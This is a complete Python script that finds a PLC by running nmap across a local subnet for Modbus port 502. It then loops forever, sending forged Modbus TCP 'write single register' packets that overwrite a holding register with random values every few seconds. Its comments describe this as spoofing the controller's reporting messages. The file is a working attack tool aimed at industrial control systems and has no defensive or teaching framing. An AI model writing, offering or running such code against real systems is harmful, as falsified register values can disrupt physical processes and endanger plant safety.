# IMPORTS
import socket
import struct
import time
import random
import subprocess
import re

# CONFIGURATION (These could be command-line arguments instead of hardcoded)
PLC_PORT = 502  # Standard Modbus TCP port - adjust if needed
SPOOF_INTERVAL = 5  # Seconds between spoofed messages
TARGET_REGISTER = 40001  # Example Modbus holding register to spoof
VALUE_RANGE = (0, 100)  # Range of spoofed values (min, max)

# Function to discover PLC IP address using nmap
def discover_plc_ip():
    try:
        # Run nmap command (requires nmap to be installed)
        nmap_process = subprocess.run(['nmap', '-p', str(PLC_PORT), '192.168.1.0/24'], capture_output=True, text=True)
        nmap_output = nmap_process.stdout
        
        # Extract IP address from nmap output
        ip_address_pattern = r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        match = re.search(ip_address_pattern, nmap_output)

        if match:
            plc_ip = match.group(1)
            print(f"PLC IP address discovered: {plc_ip}")
            return plc_ip
        else:
            print("PLC IP address not found using nmap.")
            return None
            
    except FileNotFoundError:
        print("Error: nmap not found.  Please install nmap and ensure it's in your system's PATH.")
        return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None


# Function to create a Modbus TCP spoofing packet
def create_modbus_spoof_packet(transaction_id, register_address, spoofed_value):
    """
    Creates a Modbus TCP packet to write a spoofed value to a holding register.

    Args:
        transaction_id: A unique transaction identifier (integer).  Needs to increment for each request.
        register_address: The Modbus address of the holding register to write to (integer).
        spoofed_value: The spoofed value to write to the register (integer).

    Returns:
        bytes: The Modbus TCP packet ready to be sent.
    """

    # Modbus TCP Header (7 bytes)
    header = struct.pack(">H", transaction_id)  # Transaction Identifier (2 bytes)
    header += struct.pack(">H", 0)             # Protocol Identifier (2 bytes, 0 for Modbus)
    header += struct.pack(">H", 6)             # Length (2 bytes, remaining bytes in the message)
    header += struct.pack("B", 0x01)            # Unit Identifier (1 byte, typically 1 for the PLC)

    # Modbus Function Code and Data (variable length)
    function_code = 0x06                        # Write Single Register function code
    data = struct.pack(">H", register_address)  # Register Address (2 bytes)
    data += struct.pack(">H", spoofed_value)     # Value to Write (2 bytes)

    # Combine header and data
    packet = header + struct.pack("B", function_code) + data
    return packet


# Main spoofing function
def spoof_reporting_messages(plc_ip):
    """
    Spoofs Modbus reporting messages by sending crafted packets to the PLC.
    """

    transaction_id = 1  # Start with transaction ID 1
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((plc_ip, PLC_PORT))
            print(f"Connected to PLC at {plc_ip}:{PLC_PORT}")

            while True:
                # Generate a random spoofed value
                spoofed_value = random.randint(VALUE_RANGE[0], VALUE_RANGE[1])

                # Create the spoofing packet
                packet = create_modbus_spoof_packet(transaction_id, TARGET_REGISTER - 40001, spoofed_value)  # Adjust register number
                
                # Send the packet
                sock.sendall(packet)
                print(f"Sent spoofed value {spoofed_value} to register {TARGET_REGISTER} (Transaction ID: {transaction_id})")

                # Increment transaction ID
                transaction_id += 1

                # Wait before sending the next spoofed message
                time.sleep(SPOOF_INTERVAL)

    except socket.error as e:
        print(f"Socket error: {e}")
    except KeyboardInterrupt:
        print("Spoofing stopped by user.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")



if __name__ == "__main__":
    # Discover the PLC IP address
    plc_ip_address = discover_plc_ip()

    if plc_ip_address:
        # Start spoofing messages
        spoof_reporting_messages(plc_ip_address)
    else:
        print("Failed to discover PLC IP address.  Exiting.")